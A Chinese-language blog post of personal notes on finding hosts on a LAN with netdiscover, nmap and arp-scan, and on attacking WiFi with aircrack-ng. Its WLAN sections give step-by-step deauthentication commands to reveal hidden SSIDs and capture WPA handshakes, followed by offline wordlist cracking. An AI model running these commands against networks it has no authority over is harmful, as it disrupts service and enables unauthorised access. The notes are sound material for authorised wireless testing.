---
layout: post
title: 发现局域网中的路由器设备
categories: [cm, network]
tags: [kali, netdiscover]
---

* 参考： 
  * [Use & Abuse the Address Resolution Protocol (ARP) to Locate Hosts on a Network ](https://null-byte.wonderhowto.com/how-to/use-abuse-address-resolution-protocol-arp-locate-hosts-network-0150333/)
  * [Netdiscover – simple ARP Scanner to scan for live hosts in a network](https://kalilinuxtutorials.com/netdiscover-scan-live-hosts-network/)
  * [OS Detection - Chapter 15. Nmap Reference Guide](https://nmap.org/book/man-os-detection.html)
  * [Chapter 8. Remote OS Detection](https://nmap.org/book/osdetect-usage.html)
  * [How To Know Victim Operating System – Scanning Using Nmap](https://www.hacking-tutorial.com/hacking-tutorial/how-to-know-victim-operating-system-scanning-using-nmap/#sthash.2eHBbT9h.dpbs)
  * [Use arp-scan to find hidden devices in your network](https://www.blackmoreops.com/2015/12/31/use-arp-scan-to-find-hidden-devices-in-your-network/)
  * [How to Hack WiFi Password Easily Using New Attack On WPA/WPA2](https://thehackernews.com/2018/08/how-to-hack-wifi-password.html)
  * []()
  * []()
  * []()
  * []()


## 已经在局域网中

### netdiscover

~~~
netdiscover -r 192.168.1.1/24 -PN
~~~

### nmap

~~~
# 不如 netdiscover 显示清晰
nmap -sn 192.168.1.0/24
~~~


~~~
# 可以探测OS版本（部分识别，windows基本能认出来）
# -O (Enable OS detection) Enables OS detection
nmap -v -O 192.168.1.101


# mint 19.1 无法认出来： Too many fingerprints match this host to give specific OS details.
# 使用如下命令，能在fingerprint看到 pc-linux-gnu 字样。
nmap -O -sV -T4 -d <target>
~~~

### arp-scan

~~~
arp-scan --interface=eth0 --localnet
~~~



## WLAN

### 找到隐藏的ESSID

* 参考
  * [Discover hidden wireless SSID network using kali linux](https://www.linux.com/forums/small-talk/discover-hidden-wireless-ssid-network-using-kali-linux)
  * [How to get clients mac address for aireplay-ng](https://security.stackexchange.com/questions/146362/how-to-get-clients-mac-address-for-aireplay-ng)
  * [Discover Hidden WiFi SSIDs with aircrack-ng](https://linuxconfig.org/discover-hidden-wifi-ssids-with-aircrack-ng)
  * []()
  * []()

~~~
# 查看无线网卡接口名称，一般是 wlan0 ，或 wlan0mon
iwconfig

# put the wireless interface into monitor mode
airmon-ng start wlan0mon

# dump 中找到可能的目标wifi，ESSID 一列一般显示 <length: 数字>
# 记录下 BSSID 和 CH（channel）
airodump-ng wlan0mon

# airodump 针对 刚刚找到的 BSSID 为目标
# 例如，BSSID = BC:F6:85:BF:4F:70 ， CH = 7
airodump-ng -c 7 --bssid BC:F6:85:BF:4F:70 -w psk wlan0mon

# 另外打开一个 terminal 窗口，执行如下命令，让已经连接的设备端口重连，
# 就能获取 ESSID 信息啦（回到airodump 的terminal 去看）
# -0 = Attack mode 30= de-authentication (The number of deauth packets.) 
# -a = Target access point mac address 
# 
aireplay-ng -0 30 -a BC:F6:85:BF:4F:70 wlan0mon
~~~


### 破解wifi

* 参考
  * <https://github.com/brannondorsey/wifi-cracking>
  * <https://github.com/conwnet/wpa-dictionary>
  * [用Hashcat每秒计算1.4亿个密码，破解隔壁WIFI密码](https://www.cnblogs.com/diligenceday/p/6359661.html)
  * [aircrack & hashcat 非字典高速破解目标无线密码](https://klionsec.github.io/2015/04/14/aircrack-hascat/#menu)
  * [知乎 - 用aircrack-ng破解 wifi 密码](https://zhuanlan.zhihu.com/p/34829252)
  * [Easily Assessing Wireless Networks with Kali Linux](https://blog.rapid7.com/2013/05/22/easily-assessing-wireless-networks-with-kali-linux/)
  * [How to Hack WPA/WPA2 WiFi with Kali Linux](https://www.wikihow.com/Hack-WPA/WPA2-Wi-Fi-with-Kali-Linux)
    * **很详细，从kali安装开始，多图预警**
  * [How To Hack WPA/WPA2 Wi-Fi With Kali Linux & Aircrack-ng](http://lewiscomputerhowto.blogspot.com/2014/06/how-to-hack-wpawpa2-wi-fi-with-kali.html)
  * [How to Hack WiFi Password Easily Using New Attack On WPA/WPA2](https://thehackernews.com/2018/08/how-to-hack-wifi-password.html)
  * []()


#### 截获登录wifi的4次握手包信息(.cap文件）

~~~
# 看下是 Managed 还是 monitor 模式
iwconfig

# 从Managed 模式，转为 monitor
# 可能不成功，按提示，可能要kill掉一些进程后重试，执行：
# airmon-ng check kill
airmon-ng start wlan0mon
# 或者，airmon-ng start wlan0** ，不太确定

# 开始搜索周围wifi信息，保存搜索日志到当前目录 wifis 前缀的文件中
# -M ： 打印 Manufacture信息
# 从中找到目标wifi等BSSID，例如，78:11:DC:10:4F:66
airodump-ng wlan0 -w wifis -M

# airodump 针对 刚刚找到的 BSSID 为目标
# 例如，BSSID = 78:11:DC:10:4F:66 ， CH = 7
# 从结果中找到 STATION 的 MAC 地址，例如：6C:88:14:F2:47:8C
airodump-ng -c 7 --bssid 78:11:DC:10:4F:66 -w psk wlan0mon

# 【另开一个terminal】
# 用 aireplay-ng 让目标Station断线重连，
# 在 airodump-ng 的terminal 窗口就能捕获 "WPA handshake"
# 在磁盘中找到对应的 cap 数据包，接下来用 aircrack-ng 或者 hashcat进行离线破解
aireplay-ng -0 20 -c 6C:88:14:F2:47:8C -a 78:11:DC:10:4F:66 wlan0mon

# 无线网卡退出 Monitor 模式
airmon-ng stop wlan0mon
~~~


#### 破解cap

##### aircrack-ng

~~~
aircrack-ng -w [字典-path] [破解的目标握手包-path]
~~~

~~~
aircrack-ng -a2 -b [router bssid] -w [path to wordlist] /root/Desktop/*.cap

-a is the method aircrack will use to crack the handshake, 2=WPA method.
-b stands for bssid, replace [router bssid] with the BSSID of the target router, mine is 00:14:BF:E0:E8:D5.
-w stands for wordlist, replace [path to wordlist] with the path to a wordlist that you have downloaded. I have a wordlist called “wpa.txt” in the root folder.
/root/Desktop/*.cap is the path to the .cap file containing the password. The * means wild card in Linux, and since I’m assuming that there are no other .cap files on your Desktop, this should work fine the way it is.
~~~

~~~
aircrack-ng –a2 –b 00:14:BF:E0:E8:D5 –w /root/wpa.txt  /root/Desktop/*.cap
~~~

## 技巧

### airodump-ng 超过一屏被截断

参考： <https://www.linuxquestions.org/questions/linux-newbie-8/how-to-see-all-lines-in-the-terminal-window-4175457226/>

使用 `-w` 参数指定日志文件前缀，每次运行就会在当前目录生成日志文件。
































